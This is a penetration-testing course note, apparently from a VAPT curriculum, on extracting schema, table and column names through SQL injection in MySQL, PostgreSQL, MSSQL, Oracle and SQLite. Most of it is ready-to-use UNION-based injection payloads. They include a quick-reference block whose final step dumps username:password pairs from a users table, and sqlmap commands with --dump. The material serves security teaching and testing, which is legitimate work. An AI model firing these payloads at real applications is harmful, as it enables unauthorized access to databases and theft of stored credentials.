---
tags: [vapt, sqli, intermediate]
difficulty: intermediate
module: "06 - SQL Injection"
topic: "06.23 Extracting Schema, Tables, Columns"
---

# 06.23 — Extracting Schema, Tables, Columns

## The Extraction Progression

Once SQLi is confirmed, data extraction follows a logical hierarchy:
```
1. Database/Schema names   → "What databases exist?"
2. Table names             → "What tables are in this database?"
3. Column names            → "What columns does this table have?"
4. Row data               → "What's actually in the table?"
```

---

## MySQL — Complete Extraction Reference

### Database List

```sql
-- ALL DATABASES:
SELECT schema_name FROM information_schema.schemata

-- SINGLE RESULT (for UNION with 1 visible column):
SELECT GROUP_CONCAT(schema_name SEPARATOR ',') FROM information_schema.schemata

-- EXAMPLE UNION PAYLOAD:
' UNION SELECT NULL,GROUP_CONCAT(schema_name),NULL FROM information_schema.schemata--

-- CURRENT DATABASE:
SELECT database()
SELECT schema()

-- COUNT DATABASES:
SELECT COUNT(*) FROM information_schema.schemata
```

### Table List

```sql
-- ALL TABLES IN CURRENT DB:
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- ALL TABLES AS ONE STRING:
SELECT GROUP_CONCAT(table_name ORDER BY table_name SEPARATOR ',') 
FROM information_schema.tables WHERE table_schema=database()

-- TABLES IN SPECIFIC DB:
SELECT table_name FROM information_schema.tables WHERE table_schema='myapp'

-- COUNT TABLES:
SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()

-- TABLE WITH ROW COUNT:
SELECT table_name, table_rows FROM information_schema.tables 
WHERE table_schema=database()

-- EXAMPLE PAYLOAD:
' UNION SELECT NULL,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
```

### Column List

```sql
-- ALL COLUMNS IN TABLE:
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- COLUMNS WITH DATA TYPES:
SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'

-- COLUMNS AS ONE STRING:
SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ',')
FROM information_schema.columns WHERE table_name='users'

-- COLUMNS FOR ALL TABLES (with table name):
SELECT table_name, GROUP_CONCAT(column_name) 
FROM information_schema.columns 
WHERE table_schema=database() 
GROUP BY table_name

-- EXAMPLE PAYLOAD:
' UNION SELECT NULL,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--
```

---

## PostgreSQL — Complete Extraction Reference

### Databases

```sql
-- ALL DATABASES:
SELECT datname FROM pg_database WHERE datistemplate=false

-- AS ONE STRING:
SELECT string_agg(datname, ',') FROM pg_database

-- CURRENT DATABASE:
SELECT current_database()

-- UNION PAYLOAD:
' UNION SELECT NULL,string_agg(datname,',') FROM pg_database--
```

### Tables

```sql
-- ALL TABLES IN PUBLIC SCHEMA:
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- ALL TABLES ALL SCHEMAS:
SELECT schemaname||'.'||tablename FROM pg_tables WHERE schemaname NOT LIKE 'pg_%' AND schemaname!='information_schema'

-- AS ONE STRING:
SELECT string_agg(tablename, ',') FROM pg_tables WHERE schemaname='public'

-- INFORMATION_SCHEMA:
SELECT table_name FROM information_schema.tables WHERE table_schema='public'
```

### Columns

```sql
-- ALL COLUMNS IN TABLE:
SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'

-- AS ONE STRING:
SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='users'

-- UNION PAYLOAD:
' UNION SELECT NULL,string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users'--
```

---

## MSSQL — Complete Extraction Reference

### Databases

```sql
-- ALL DATABASES:
SELECT name FROM master..sysdatabases
SELECT name FROM master.sys.databases

-- AS ONE STRING:
SELECT STUFF((SELECT ','+name FROM master..sysdatabases FOR XML PATH('')),1,1,'')

-- CURRENT DB:
SELECT DB_NAME()
```

### Tables

```sql
-- CURRENT DB TABLES:
SELECT name FROM sysobjects WHERE xtype='U'
SELECT name FROM sys.tables
SELECT table_name FROM information_schema.tables

-- AS ONE STRING:
SELECT STUFF((SELECT ','+name FROM sysobjects WHERE xtype='U' FOR XML PATH('')),1,1,'')

-- SPECIFIC DATABASE:
SELECT name FROM myapp..sysobjects WHERE xtype='U'
```

### Columns

```sql
-- COLUMNS IN TABLE:
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- WITH DATA TYPE:
SELECT name, TYPE_NAME(xtype) FROM syscolumns WHERE id=OBJECT_ID('users')

-- AS ONE STRING:
SELECT STUFF((SELECT ','+name FROM syscolumns WHERE id=OBJECT_ID('users') FOR XML PATH('')),1,1,'')
```

---

## Oracle — Complete Extraction Reference

### Schemas (= users in Oracle)

```sql
-- ALL SCHEMAS:
SELECT username FROM all_users
SELECT owner FROM all_tables GROUP BY owner

-- CURRENT SCHEMA:
SELECT user FROM dual

-- AS ONE STRING:
SELECT LISTAGG(username,',') WITHIN GROUP (ORDER BY 1) FROM all_users
```

### Tables

```sql
-- TABLES IN CURRENT SCHEMA:
SELECT table_name FROM user_tables

-- ALL ACCESSIBLE TABLES:
SELECT table_name, owner FROM all_tables WHERE owner NOT IN ('SYS','SYSTEM','OUTLN')

-- AS ONE STRING:
SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY 1) FROM all_tables WHERE owner=user
```

### Columns

```sql
-- COLUMNS IN TABLE (Oracle uses UPPERCASE table names!):
SELECT column_name, data_type FROM all_columns WHERE table_name='USERS' AND owner=user

-- AS ONE STRING:
SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY 1) FROM all_columns WHERE table_name='USERS'
```

---

## SQLite — Complete Extraction Reference

### Databases

```sql
-- SQLite has ONE database per file — no "list databases"
-- The current database IS the file you're connected to

-- CURRENT DB FILE:
PRAGMA database_list
-- Returns: seq, name, file
```

### Tables

```sql
-- ALL TABLES:
SELECT name FROM sqlite_master WHERE type='table'
SELECT tbl_name FROM sqlite_master WHERE type='table'

-- AS ONE STRING:
SELECT GROUP_CONCAT(name,',') FROM sqlite_master WHERE type='table'
```

### Columns (via CREATE statement)

```sql
-- SQLite STORES the CREATE TABLE statement — fastest way to get columns:
SELECT sql FROM sqlite_master WHERE name='users'
-- Returns: CREATE TABLE users (id INTEGER, username TEXT, password TEXT)
-- Reveals ALL columns with types!

-- JUST COLUMN NAMES (pragma):
PRAGMA table_info(users)
-- Returns: cid, name, type, notnull, dflt_value, pk

-- AS ONE STRING:
SELECT GROUP_CONCAT(name,',') FROM pragma_table_info('users')
```

---

## Universal Extraction Payloads (Quick Reference)

```bash
# =============================================================
# STEP 1: GET DATABASE/SCHEMA NAME
# MySQL:      ' UNION SELECT NULL,database()--
# PostgreSQL: ' UNION SELECT NULL,current_database()--
# MSSQL:      ' UNION SELECT NULL,DB_NAME()--
# Oracle:     ' UNION SELECT NULL,user FROM dual--
# SQLite:     ' UNION SELECT NULL,sqlite_version()--

# STEP 2: GET TABLES
# MySQL:      ' UNION SELECT NULL,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--
# PostgreSQL: ' UNION SELECT NULL,string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'--
# MSSQL:      ' UNION SELECT NULL,(SELECT STUFF((SELECT ','+name FROM sysobjects WHERE xtype='U' FOR XML PATH('')),1,1,''))--
# Oracle:     ' UNION SELECT NULL,LISTAGG(table_name,',') WITHIN GROUP (ORDER BY 1) FROM all_tables WHERE owner=user--
# SQLite:     ' UNION SELECT NULL,GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'--

# STEP 3: GET COLUMNS (for table 'users')
# MySQL:      ' UNION SELECT NULL,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--
# PostgreSQL: ' UNION SELECT NULL,string_agg(column_name,',') FROM information_schema.columns WHERE table_name='users'--
# MSSQL:      ' UNION SELECT NULL,(SELECT STUFF((SELECT ','+name FROM syscolumns WHERE id=OBJECT_ID('users') FOR XML PATH('')),1,1,''))--
# Oracle:     ' UNION SELECT NULL,LISTAGG(column_name,',') WITHIN GROUP (ORDER BY 1) FROM all_columns WHERE table_name='USERS'--
# SQLite:     ' UNION SELECT NULL,sql FROM sqlite_master WHERE name='users'--

# STEP 4: GET DATA
# MySQL:      ' UNION SELECT NULL,GROUP_CONCAT(username,':',password) FROM users--
# PostgreSQL: ' UNION SELECT NULL,string_agg(username||':'||password,',') FROM users--
# MSSQL:      ' UNION SELECT NULL,(SELECT STUFF((SELECT ','+username+':'+password FROM users FOR XML PATH('')),1,1,''))--
# Oracle:     ' UNION SELECT NULL,LISTAGG(username||':'||password,',') WITHIN GROUP (ORDER BY 1) FROM users--
# SQLite:     ' UNION SELECT NULL,GROUP_CONCAT(username||':'||password,',') FROM users--
```

---

## sqlmap Extraction Commands

```bash
# FASTEST: Use sqlmap with -r saved_request.txt
sqlmap -r req.txt --current-db --current-user --batch
sqlmap -r req.txt --tables -D myapp --batch
sqlmap -r req.txt --columns -D myapp -T users --batch
sqlmap -r req.txt --dump -D myapp -T users --batch
```

---

## Related Notes
- [[04 - Union-Based SQLi]] — UNION SELECT technique
- [[03 - Error-Based SQLi]] — alternative extraction method
- [[15 - MySQL Specific Payloads]] — MySQL information_schema
- [[17 - MSSQL Specific Payloads]] — MSSQL sys tables
- [[21 - sqlmap Full Usage Guide]] — automated extraction
